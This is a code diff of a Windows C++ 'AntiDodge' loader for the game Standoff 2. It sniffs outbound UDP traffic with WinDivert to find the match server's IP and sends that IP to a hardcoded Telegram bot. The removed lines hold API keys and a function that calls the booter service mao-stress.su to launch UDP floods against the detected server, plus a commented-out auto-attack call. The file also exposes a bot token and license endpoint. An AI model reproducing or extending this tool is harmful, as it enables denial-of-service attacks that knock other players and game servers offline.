@@ -13,40 +13,25 @@ const char* GOOGLE_API_URL = "https://script.google.com/macros/s/AKfycbyGZcv_RB2
 const char* BOT_TOKEN = "8653498484:AAE1HIez8xwfKopD-FGH7mb7h8pwHgnJapU";
 const char* ADMIN_ID = "112065332";
 
-// ========== MAO-STRESS КЛЮЧИ ==========
-const int MAO_USER = 10893;
-const char* MAO_KEY_30 = "83zNHDrE0fD4Pv2nQd-MM9EJ71C";
-const char* MAO_KEY_60 = "tF5-0T5q1pgDqfB9vIBGAF0T1BY";
-const char* MAO_KEY_120 = "TIg445aV0QbgYXGej5y-SML88EC";
-
 // ========== WinDivert ==========
 typedef HANDLE(WINAPI* pWinDivertOpen)(const char*, DWORD, WORD, DWORD);
 typedef BOOL(WINAPI* pWinDivertRecv)(HANDLE, void*, DWORD, DWORD*, void*);
 pWinDivertOpen WinDivertOpen = NULL;
 pWinDivertRecv WinDivertRecv = NULL;
-HMODULE g_hWinDivert = NULL;
+HMODULE hWinDivert = NULL;
 
 bool LoadWinDivert() {
-    g_hWinDivert = LoadLibraryA("WinDivert.dll");
-    if (!g_hWinDivert) return false;
-    WinDivertOpen = (pWinDivertOpen)GetProcAddress(g_hWinDivert, "WinDivertOpen");
-    WinDivertRecv = (pWinDivertRecv)GetProcAddress(g_hWinDivert, "WinDivertRecv");
+    hWinDivert = LoadLibraryA("WinDivert.dll");
+    if (!hWinDivert) return false;
+    WinDivertOpen = (pWinDivertOpen)GetProcAddress(hWinDivert, "WinDivertOpen");
+    WinDivertRecv = (pWinDivertRecv)GetProcAddress(hWinDivert, "WinDivertRecv");
     return WinDivertOpen && WinDivertRecv;
 }
 
-// ========== HTTP ЗАПРОСЫ ==========
-std::string HttpPost(const std::string& url, const std::string& jsonData) {
-    std::string host, path;
-    size_t pos = url.find("://");
-    pos = (pos == std::string::npos) ? 0 : pos + 3;
-    size_t slash = url.find("/", pos);
-    if (slash != std::string::npos) {
-        host = url.substr(pos, slash - pos);
-        path = url.substr(slash);
-    } else {
-        host = url.substr(pos);
-        path = "/";
-    }
+// ========== HTTP ЗАПРОС ==========
+std::string HttpPost(const std::string& jsonData) {
+    std::string host = "script.google.com";
+    std::string path = "/macros/s/AKfycbyGZcv_RB2UTrgn9VwaDFuN_Z3QkbiqgoNUDEKKe3QyqkfNDQXDWslPk_TLYh2OTGEI/exec";
     
     HINTERNET hSession = WinHttpOpen(L"Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return "";
@@ -76,63 +61,23 @@ std::string HttpPost(const std::string& url, const std::string& jsonData) {
     return result;
 }
 
-std::string HttpGet(const std::string& url) {
-    std::string host, path;
-    size_t pos = url.find("://");
-    pos = (pos == std::string::npos) ? 0 : pos + 3;
-    size_t slash = url.find("/", pos);
-    if (slash != std::string::npos) {
-        host = url.substr(pos, slash - pos);
-        path = url.substr(slash);
-    } else {
-        host = url.substr(pos);
-        path = "/";
-    }
-    
-    HINTERNET hSession = WinHttpOpen(L"Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    if (!hSession) return "";
-    
-    std::wstring whost(host.begin(), host.end());
-    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }
-    
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", std::wstring(path.begin(), path.end()).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }
-    
-    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
-    WinHttpReceiveResponse(hRequest, NULL);
-    
-    std::string result;
-    DWORD bytesRead = 0;
-    char buffer[4096];
-    while (WinHttpReadData(hRequest, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
-        buffer[bytesRead] = 0;
-        result += buffer;
-    }
-    
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-    return result;
-}
-
-// ========== РЕЕСТР ДЛЯ ЛИЦЕНЗИИ ==========
-bool SaveLicenseToRegistry(const std::string& key) {
+// ========== РЕЕСТР ДЛЯ КЛЮЧА ==========
+bool SaveKeyToRegistry(const std::string& key) {
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
         return false;
-    RegSetValueExA(hKey, "license_key", 0, REG_SZ, (const BYTE*)key.c_str(), key.length() + 1);
+    RegSetValueExA(hKey, "key", 0, REG_SZ, (const BYTE*)key.c_str(), key.length() + 1);
     RegCloseKey(hKey);
     return true;
 }
 
-bool LoadLicenseFromRegistry(std::string& key) {
+bool LoadKeyFromRegistry(std::string& key) {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
         return false;
     char buf[256];
     DWORD size = sizeof(buf);
-    if (RegQueryValueExA(hKey, "license_key", NULL, NULL, (LPBYTE)buf, &size) != ERROR_SUCCESS) {
+    if (RegQueryValueExA(hKey, "key", NULL, NULL, (LPBYTE)buf, &size) != ERROR_SUCCESS) {
         RegCloseKey(hKey);
         return false;
     }
@@ -141,7 +86,7 @@ bool LoadLicenseFromRegistry(std::string& key) {
     return true;
 }
 
-void ClearLicenseFromRegistry() {
+void ClearKeyFromRegistry() {
     RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2");
 }
 
@@ -154,61 +99,26 @@ std::string GetHWID() {
     return std::string(buf);
 }
 
-// ========== ПРОВЕРКА ЛИЦЕНЗИИ ==========
-bool CheckLicense(const std::string& key, const std::string& hwid) {
+// ========== ПРОВЕРКА КЛЮЧА ==========
+bool CheckKey(const std::string& key, const std::string& hwid) {
     std::string json = "{\"action\":\"activate_loader\",\"loader_key\":\"" + key + "\",\"hwid\":\"" + hwid + "\"}";
-    std::string response = HttpPost(GOOGLE_API_URL, json);
+    std::string response = HttpPost(json);
     return response.find("\"valid\":true") != std::string::npos;
 }
 
-// ========== АТАКА ЧЕРЕЗ MAO-STRESS ==========
-bool SendMaoAttack(const std::string& ip, int port, int duration) {
-    const char* api_key = MAO_KEY_30;
-    if (duration == 30) api_key = MAO_KEY_30;
-    else if (duration == 60) api_key = MAO_KEY_60;
-    else if (duration == 120) api_key = MAO_KEY_120;
-    else return false;
-    
-    char url[512];
-    sprintf_s(url, "https://mao-stress.su/api/start.php?user=%d&api_key=%s&target=%s&port=%d&duration=%d&method=UDP-PPS",
-        MAO_USER, api_key, ip.c_str(), port, duration);
-    
-    std::string response = HttpGet(url);
-    return response.find("Attack started") != std::string::npos;
-}
-
 // ========== УВЕДОМЛЕНИЕ В TELEGRAM ==========
-void SendTelegramNotification(const std::string& ip, int port) {
+void SendTelegram(const std::string& ip, int port) {
     char url[512];
-    sprintf_s(url, "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=🎮 Server: %s:%d", BOT_TOKEN, ADMIN_ID, ip.c_str(), port);
-    HttpGet(url);
+    sprintf_s(url, "curl -s \"https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=Server: %s:%d\"", BOT_TOKEN, ADMIN_ID, ip.c_str(), port);
+    system(url);
 }
 
-// ========== ПОИСК PID HD-PLAYER.EXE ==========
-DWORD GetHdPlayerPid() {
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE) return 0;
-    
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-    if (Process32First(snapshot, &pe)) {
-        do {
-            if (_stricmp(pe.szExeFile, "HD-Player.exe") == 0) {
-                CloseHandle(snapshot);
-                return pe.th32ProcessID;
-            }
-        } while (Process32Next(snapshot, &pe));
-    }
-    CloseHandle(snapshot);
-    return 0;
-}
-
-// ========== ПОИСК СЕРВЕРА ЧЕРЕЗ WINDIVERT ==========
-bool FindGameServer(std::string& out_ip, int& out_port) {
+// ========== ПОИСК СЕРВЕРА ==========
+bool FindServer(std::string& out_ip) {
     if (!LoadWinDivert()) return false;
     
     HANDLE handle = WinDivertOpen("udp and outbound", 0, 0, 0);
-    if (handle == INVALID_HANDLE_VALUE) { FreeLibrary(g_hWinDivert); return false; }
+    if (handle == INVALID_HANDLE_VALUE) { FreeLibrary(hWinDivert); return false; }
     
     BYTE packet[4096];
     DWORD read;
@@ -219,13 +129,13 @@ bool FindGameServer(std::string& out_ip, int& out_port) {
         if (WinDivertRecv(handle, packet, sizeof(packet), &read, NULL)) {
             for (int i = 0; i < (int)read - 20; i++) {
                 if ((packet[i] & 0xF0) == 0x40) {
-                    struct in_addr addr;
-                    addr.S_un.S_addr = *(DWORD*)(packet + i + 16);
-                    char* ipStr = inet_ntoa(addr);
-                    std::string ip(ipStr);
-                    if (ip.find("127.") != 0 && ip.find("192.168.") != 0 && 
-                        ip.find("10.") != 0 && ip.find("172.") != 0) {
-                        servers[ip]++;
+                    DWORD addr = *(DWORD*)(packet + i + 16);
+                    struct in_addr in;
+                    in.S_un.S_addr = addr;
+                    char* ip = inet_ntoa(in);
+                    std::string sip(ip);
+                    if (sip.find("127.") != 0 && sip.find("192.168.") != 0 && sip.find("10.") != 0) {
+                        servers[sip]++;
                     }
                     break;
                 }
@@ -234,20 +144,17 @@ bool FindGameServer(std::string& out_ip, int& out_port) {
     }
     
     WinDivertClose(handle);
-    FreeLibrary(g_hWinDivert);
+    FreeLibrary(hWinDivert);
     
     if (servers.empty()) return false;
     
-    std::string bestIp;
-    int bestCount = 0;
-    for (auto& pair : servers) {
-        if (pair.second > bestCount) {
-            bestCount = pair.second;
-            bestIp = pair.first;
+    int maxCount = 0;
+    for (auto& p : servers) {
+        if (p.second > maxCount) {
+            maxCount = p.second;
+            out_ip = p.first;
         }
     }
-    out_ip = bestIp;
-    out_port = 0;
     return true;
 }
 
@@ -256,61 +163,47 @@ int main() {
     printf("AntiDodge SO2 Loader\n");
     printf("Telegram: @AntiDodgeSo2\n\n");
     
-    // Проверка лицензии
+    // Проверка ключа
     std::string hwid = GetHWID();
-    std::string saved_key;
-    bool license_valid = false;
+    std::string savedKey;
+    bool valid = false;
     
-    if (LoadLicenseFromRegistry(saved_key)) {
-        if (CheckLicense(saved_key, hwid)) {
-            license_valid = true;
+    if (LoadKeyFromRegistry(savedKey)) {
+        if (CheckKey(savedKey, hwid)) {
+            valid = true;
             printf("License: ACTIVE\n");
         } else {
-            ClearLicenseFromRegistry();
+            ClearKeyFromRegistry();
         }
     }
     
-    if (!license_valid) {
+    if (!valid) {
         printf("ACTIVATION REQUIRED\n");
         printf("Enter your license key: ");
         std::string key;
         std::cin >> key;
         
-        if (CheckLicense(key, hwid)) {
-            SaveLicenseToRegistry(key);
+        if (CheckKey(key, hwid)) {
+            SaveKeyToRegistry(key);
             printf("License activated!\n");
-            license_valid = true;
+            valid = true;
         } else {
-            printf("Activation failed!\n");
-            printf("Press Enter to exit...");
-            getchar(); getchar();
+            printf("Invalid key!\n");
+            system("pause");
             return 1;
         }
-    }
-    
-    if (!license_valid) {
-        printf("Press Enter to exit...");
-        getchar();
-        return 1;
     }
     
     printf("\nAntiDodge Work\n");
     printf("Start Standoff 2 match\n\n");
     
-    std::string last_ip;
+    std::string lastIp;
     while (true) {
         std::string ip;
-        int port;
-        
-        if (FindGameServer(ip, port)) {
-            if (ip != last_ip) {
-                last_ip = ip;
-                printf("Game server detected: %s:%d\n", ip.c_str(), port);
-                SendTelegramNotification(ip, port);
-                
-                // Автоматическая атака (опционально)
-                // SendMaoAttack(ip, port, 60);
-            }
+        if (FindServer(ip) && ip != lastIp) {
+            lastIp = ip;
+            printf("Server: %s\n", ip.c_str());
+            SendTelegram(ip, 0);
         }
         Sleep(10000);
     }
